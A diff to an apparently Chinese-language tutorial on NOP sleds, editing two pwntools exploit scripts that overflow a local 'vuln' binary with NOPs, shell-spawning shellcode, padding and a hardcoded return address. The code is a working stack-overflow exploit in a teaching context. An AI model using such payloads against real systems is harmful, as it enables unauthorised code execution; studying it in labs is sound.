@@ -91,20 +91,20 @@ NOP 指令是 `XCHG EAX, EAX` 的别名（32 bit 系统中），它实际上什�
 ```python {title="exp.py"}
 from pwn import *
 
+context(os='linux', arch='amd64', log_level='info')
+
 context.binary = ELF('./vuln')
 
 p = process()
 
-# 使用 NOP
+# 构建 NOPs
 payload = b'\x90' * 240
 # 构建 shellcode
 payload += asm(shellcraft.sh())
 # 溢出 Padding
 payload = payload.ljust(312, b'A')
-# 缓冲区地址 + 一半 NOP 长度
-payload += p32(0xffffd6b4 + 120)
-
-log.info(p.clean())
+# 缓冲区地址 + 一半 NOPs 长度
+payload += p32(0xffffd664 + 120)
 
 p.sendline(payload)
 
@@ -130,20 +130,20 @@ nop = asm(shellcraft.nop())
 ```python {title="exp.py"}
 from pwn import *
 
+context(os='linux', arch='amd64', log_level='info')
+
 context.binary = ELF('./vuln')
 
 p = process()
 
-# 使用 NOP
+# 构建 NOPs
 payload = asm(shellcraft.nop()) * 240
 # 构建 shellcode
 payload += asm(shellcraft.sh())
 # 溢出 Padding
 payload = payload.ljust(312, b'A')
-# 缓冲区地址 + 一半 NOP 长度
-payload += p32(0xffffd6b4 + 120)
-
-log.info(p.clean())
+# 缓冲区地址 + 一半 NOPs 长度
+payload += p32(0xffffd664 + 120)
 
 p.sendline(payload)
 
